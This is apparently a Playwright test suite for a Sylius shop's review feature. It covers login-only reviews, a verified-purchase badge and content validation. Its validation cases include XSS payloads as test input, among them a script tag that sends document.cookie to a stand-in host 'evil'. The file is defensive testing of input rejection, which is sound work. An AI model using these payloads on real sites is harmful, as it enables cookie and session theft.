import { expect, test, type Locator, type Page } from '@playwright/test';
import {
  addFirstProductToCart,
  completeOrderPaymentInAdmin,
  placeOfflineOrder,
  registerVerifiedCustomer,
  uniqueEmail,
} from './helpers';

const PRODUCT_SLUG = 'olejek-eteryczny-eukaliptus';

test.describe('Opinie tylko dla zalogowanych', () => {
  test('gość na stronie produktu dostaje zachętę do logowania zamiast formularza', async ({ page }) => {
    await page.goto(`/sklep/produkty/${PRODUCT_SLUG}`);

    const loginCta = page.locator('a[href*="/sklep/login"]', { hasText: 'Zaloguj się, aby dodać opinię' });
    await expect(loginCta.first()).toBeVisible();

    const href = await loginCta.first().getAttribute('href');
    expect(href, 'logowanie wraca na formularz opinii').toContain('_target_path');
    expect(href).toContain('recenzje');
  });

  test('gość wchodzący wprost na formularz opinii ląduje na logowaniu', async ({ page }) => {
    await page.goto(`/sklep/produkty/${PRODUCT_SLUG}/recenzje/nowa`);

    await expect(page).toHaveURL(/\/sklep\/login/);
    await expect(page.locator('[name="sylius_shop_product_review[comment]"]')).toHaveCount(0);
  });

  test('zalogowany klient dodaje opinię bez podawania e-maila', async ({ page }) => {
    const email = uniqueEmail('opinia-zalogowany');
    await registerVerifiedCustomer(page, email);

    await page.goto(`/sklep/produkty/${PRODUCT_SLUG}/recenzje/nowa`);
    await expect(page.locator('[name="sylius_shop_product_review[author][email]"]')).toHaveCount(0);

    await addReview(page, PRODUCT_SLUG, 'Bardzo dobry olejek', 'Zapach utrzymuje sie dlugo i jest naturalny.');
  });
});

test.describe('Badge Zweryfikowano zakupem', () => {
  test('opinia kupującego dostaje badge, opinia bez zakupu go nie ma', async ({ page }) => {
    const buyerEmail = uniqueEmail('kupujacy');
    const strangerEmail = uniqueEmail('bez-zakupu');
    const buyerTitle = `Opinia po zakupie ${Date.now()}`;
    const strangerTitle = `Opinia bez zakupu ${Date.now()}`;

    await registerVerifiedCustomer(page, buyerEmail);
    await addFirstProductToCart(page);

    const slug = new URL(page.url()).pathname.split('/').filter(Boolean).pop() ?? '';
    const orderNumber = await placeOfflineOrder(page, buyerEmail);
    await completeOrderPaymentInAdmin(page, orderNumber);

    await addReview(page, slug, buyerTitle, 'Produkt kupiony w tym sklepie, polecam.');
    await page.goto(`/sklep/produkty/${slug}/recenzje/`);
    await expect(reviewCard(page, buyerTitle)).toContainText('Zweryfikowano zakupem');

    await page.goto('/sklep/logout');
    await registerVerifiedCustomer(page, strangerEmail);

    await addReview(page, slug, strangerTitle, 'Znam ten produkt skadinad, ale go tu nie kupilam.');
    await page.goto(`/sklep/produkty/${slug}/recenzje/`);
    await expect(reviewCard(page, strangerTitle)).not.toContainText('Zweryfikowano zakupem');
  });
});

test.describe('Walidacja treści opinii', () => {
  const CASES = [
    { name: 'za krótka treść', title: 'Krótko', comment: 'ok' },
    { name: 'skrypt w treści', title: 'Normalny tytuł', comment: '<script>fetch("http://evil/"+document.cookie)</script> reszta treści opinii' },
    { name: 'atrybut zdarzenia', title: 'Normalny tytuł', comment: '<img src=x onerror=alert(1)> treść uzupełniająca do dwudziestu znaków' },
    { name: 'javascript: w tytule', title: 'javascript:alert(1)', comment: 'Zupełnie normalna treść opinii o produkcie.' },
    { name: 'znacznik w tytule', title: '<b>pogrubione</b>', comment: 'Zupełnie normalna treść opinii o produkcie.' },
  ];

  for (const { name, title, comment } of CASES) {
    test(`odrzuca opinię: ${name}`, async ({ page }) => {
      await registerVerifiedCustomer(page, uniqueEmail('walidacja'));

      await page.goto(`/sklep/produkty/${PRODUCT_SLUG}/recenzje/nowa`);
      await page.fill('[name="sylius_shop_product_review[title]"]', title);
      await page.fill('[name="sylius_shop_product_review[comment]"]', comment);
      await page.locator('.sylius-rating label').nth(4).click();
      await page.locator('button[type="submit"], input[type="submit"]').last().click();

      await expect(page, 'formularz zostaje z błędem, opinia nie wchodzi').toHaveURL(/recenzje\/nowa/);
      await expect(page.locator('.invalid-feedback').first()).toBeVisible();
      await expect(page.locator('[data-oma-review-errors]'), 'podsumowanie błędów nad formularzem').toBeVisible();
    });
  }

  test('brak oceny mówi wprost, czego brakuje', async ({ page }) => {
    await registerVerifiedCustomer(page, uniqueEmail('bez-oceny'));

    await page.goto(`/sklep/produkty/${PRODUCT_SLUG}/recenzje/nowa`);
    await page.fill('[name="sylius_shop_product_review[title]"]', 'Tytuł opinii');
    await page.fill('[name="sylius_shop_product_review[comment]"]', 'Treść opinii wystarczająco długa, żeby przejść walidację.');
    await page.locator('button[type="submit"], input[type="submit"]').last().click();

    const summary = page.locator('[data-oma-review-errors]');
    await expect(summary).toBeVisible();
    await expect(summary).toContainText('oceny');
    await expect(page.locator('.invalid-feedback').first(), 'i przy samym polu oceny').toBeVisible();
  });

  test('przyjmuje zwykłą opinię tekstową', async ({ page }) => {
    await registerVerifiedCustomer(page, uniqueEmail('walidacja-ok'));

    await addReview(page, PRODUCT_SLUG, 'Swietny olejek', 'Zapach eukaliptusa utrzymuje sie dlugo, polecam na wieczor.');
  });
});

function reviewCard(page: Page, title: string): Locator {
  return page.locator('div.border-bottom').filter({ hasText: title }).first();
}

async function addReview(page: Page, slug: string, title: string, comment: string): Promise<void> {
  await page.goto(`/sklep/produkty/${slug}/recenzje/nowa`);
  await page.fill('[name="sylius_shop_product_review[title]"]', title);
  await page.fill('[name="sylius_shop_product_review[comment]"]', comment);
  await page.locator('.sylius-rating label').nth(4).click();
  await page.locator('button[type="submit"], input[type="submit"]').last().click();
  await expect(page).toHaveURL(new RegExp(`produkty/${slug}$`));
}
